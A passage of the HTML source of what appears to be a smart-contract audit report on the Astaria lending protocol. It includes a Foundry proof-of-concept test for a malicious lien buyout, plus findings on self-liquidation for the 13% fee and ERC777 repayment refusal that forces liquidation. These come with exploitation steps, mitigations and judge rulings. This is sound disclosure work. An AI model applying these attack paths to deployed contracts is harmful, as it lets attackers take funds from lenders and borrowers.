&quot;../TransferProxy.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {WithdrawProxy} from &quot;../WithdrawProxy.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Strings2} from &quot;./utils/Strings2.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;./TestHelpers.t.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {OrderParameters} from &quot;seaport/lib/ConsiderationStructs.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract AstariaTest is TestHelpers {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using FixedPointMathLib for uint256;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using CollateralLookup for address;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using SafeCastLib for uint256;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  event NonceUpdated(uint256 nonce);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  event VaultShutdown();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function testBuyoutBeforeWithdraw() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TestNFT nft = new TestNFT(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address tokenContract = address(nft);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 tokenId = uint256(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address publicVault = _createPublicVault({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      delegate: strategistTwo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      epochLength: 7 days</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _lendToVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      Lender({addr: address(1), amountToLend: 60 ether}),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      publicVault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address publicVault2 = _createPublicVault({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      delegate: strategistTwo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      epochLength: 7 days</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _lendToVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      Lender({addr: address(1), amountToLend: 60 ether}),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      publicVault2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (, ILienToken.Stack[] memory stack) = _commitToLien({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      vault: publicVault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategistPK: strategistOnePK,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      tokenContract: tokenContract,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      tokenId: tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      lienDetails: standardLienDetails,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      amount: 40 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      isFirstLien: true</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.warp(block.timestamp + 3 days);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      vault: publicVault2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategistPK: strategistOnePK,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      tokenContract: tokenContract,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      tokenId: tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      lienDetails: ILienToken.Details({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        maxAmount: 50 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        rate: (uint256(1e16) * 70) / (365 days),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        duration: 25 days,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        maxPotentialDebt: 53 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        liquidationInitialAsk: 500 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      amount: 10 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      stack: stack</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _signalWithdraw(address(1), publicVault2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _warpToEpochEnd(publicVault2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    PublicVault(publicVault2).processEpoch();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VaultImplementation(publicVault2).buyoutLien(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      stack,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint8(0),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      refinanceTerms</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    PublicVault(publicVault2).transferWithdrawReserve();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    WithdrawProxy withdrawProxy = PublicVault(publicVault2).getWithdrawProxy(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertTrue(WETH9.balanceOf(address(withdrawProxy)) &lt; 20 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"tools-used-11\" style=\"position:relative;\"><a href=\"#tools-used-11\" aria-label=\"tools used 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-34\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-34\" aria-label=\"recommended mitigation steps 34 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Enforce a call to transferWithdrawReserve() before a buyout executes (similar to commitLien).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1405972473\">SantiagoGregory (Astaria) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>@androolloyd - should this still be high severity? This may be a strategist trust issue, but it is more malicious than just writing bad loan terms.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1418314799\">SantiagoGregory (Astaria) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Since this is more of a strategist trust issue, we think this would make more sense as medium severity. Even with the fix, the issue of malicious refinancing would still partially exist.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1435723056\">Picodes (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I do agree with Medium severity, considering it is a griefing attack by the strategist.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-19-users-are-forced-to-approve-router-for-full-collection-to-use-committoliens-function\" style=\"position:relative;\"><a href=\"#m-19-users-are-forced-to-approve-router-for-full-collection-to-use-committoliens-function\" aria-label=\"m 19 users are forced to approve router for full collection to use committoliens function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/283\">[M-19] Users are forced to approve Router for full collection to use commitToLiens() function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/283\">obront</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L780-L785\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L780-L785</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L287-L306\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L287-L306</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L233-L244\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L233-L244</a></p>\n<p>When a user calls Router#commitToLiens(), the Router calls <code>commitToLien()</code>. The comments specify:</p>\n<p><code>//router must be approved for the collateral to take a loan,</code></p>\n<p>However, the Router being approved isn’t enough. It must be approved for all, which is a level of approvals that many users are not comfortable with. This is because, when the commitment is validated, it is checked as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 collateralId = params.tokenContract.computeId(params.tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address holder = CT.ownerOf(collateralId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address operator = CT.getApproved(collateralId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      msg.sender != holder &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      receiver != holder &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      receiver != operator &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      !CT.isApprovedForAll(holder, msg.sender)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"proof-of-concept-37\" style=\"position:relative;\"><a href=\"#proof-of-concept-37\" aria-label=\"proof of concept 37 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The check above allows the following situations pass:</p>\n<ul>\n<li>caller of the function == owner of the NFT</li>\n<li>receiver of the loan == owner of the NFT</li>\n<li>receiver of the loan == address approved for the individual NFT</li>\n<li>caller of the function == address approved for all</li>\n</ul>\n<p>This is inconsistent and doesn’t make much sense. The approved users should have the same permissions.</p>\n<p>More importantly, the most common flow (that the address approved for the individual NFT — the Router — is the caller) does not work and will lead to the function reverting.</p>\n<h3 id=\"recommended-mitigation-steps-35\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-35\" aria-label=\"recommended mitigation steps 35 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the check to include <code>msg.sender != operator</code> rather than <code>receiver != operator</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/283\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/283#issuecomment-1439014063\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Keeping medium severity, considering this is a broken functionality.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-20-users-can-liquidate-themselves-before-others-allowing-them-to-take-13-above-their-borrowers\" style=\"position:relative;\"><a href=\"#m-20-users-can-liquidate-themselves-before-others-allowing-them-to-take-13-above-their-borrowers\" aria-label=\"m 20 users can liquidate themselves before others allowing them to take 13 above their borrowers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/281\">[M-20] Users can liquidate themselves before others, allowing them to take 13% above their borrowers</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/281\">obront</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/363\">caventa</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L611-L619\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L611-L619</a></p>\n<p>The <code>canLiquidate()</code> function allows liquidations to take place if either (a) the loan is over and still exists or (b) the caller owns the collateral.</p>\n<p>In the second case, due to the liquidation fee (currently 13%), this can give a borrower an unfair position to be able to reclaim a percentage of the liquidation that should be going to their lenders.</p>\n<h3 id=\"proof-of-concept-38\" style=\"position:relative;\"><a href=\"#proof-of-concept-38\" aria-label=\"proof of concept 38 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>A borrower puts up a piece of collateral and takes a loan of 10 WETH</li>\n<li>The collateral depreciates in value and they decide to keep the 10 WETH</li>\n<li>Right before the loans expire, the borrower can call <code>liquidate()</code> themselves</li>\n<li>This sets them as the <code>liquidator</code> and gives them the first 13% return on the auction</li>\n<li>While the lenders are left at a loss, the borrower gets to keep the 10 WETH and get a 1.3 WETH bonus</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-36\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-36\" aria-label=\"recommended mitigation steps 36 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Don’t allow users to liquidate their own loans until they are liquidatable by the public.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/281\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-21-when-a-private-vault-offers-a-loan-in-erc777-tokens-the-private-vault-can-refuse-to-receive-repayment-in-the-safetransferfrom-callback-to-force-liquidation-of-the-borrowers-collateral\" style=\"position:relative;\"><a href=\"#m-21-when-a-private-vault-offers-a-loan-in-erc777-tokens-the-private-vault-can-refuse-to-receive-repayment-in-the-safetransferfrom-callback-to-force-liquidation-of-the-borrowers-collateral\" aria-label=\"m 21 when a private vault offers a loan in erc777 tokens the private vault can refuse to receive repayment in the safetransferfrom callback to force liquidation of the borrowers collateral permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/247\">[M-21] When a private vault offers a loan in ERC777 tokens, the private vault can refuse to receive repayment in the safeTransferFrom callback to force liquidation of the borrower’s collateral</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/247\">cccz</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/382\">KIntern_NA</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/248\">cccz</a></em></p>\n<p>When the borrower calls LienToken.makePayment to repay the loan, safeTransferFrom is used to send tokens to the recipient of the vault, which in the case of a private vault is the owner of the private vault.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">recipient</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">IMPL_TYPE</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IAstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ImplementationType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>If the token for the loan is an ERC777 token, a malicious private vault owner can refuse to receive repayment in the callback, which results in the borrower not being able to repay the loan and the borrower’s collateral being auctioned off when the loan expires.</p>\n<h3 id=\"proof-of-concept-39\" style=\"position:relative;\"><a href=\"#proof-of-concept-39\" aria-label=\"proof of concept 39 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 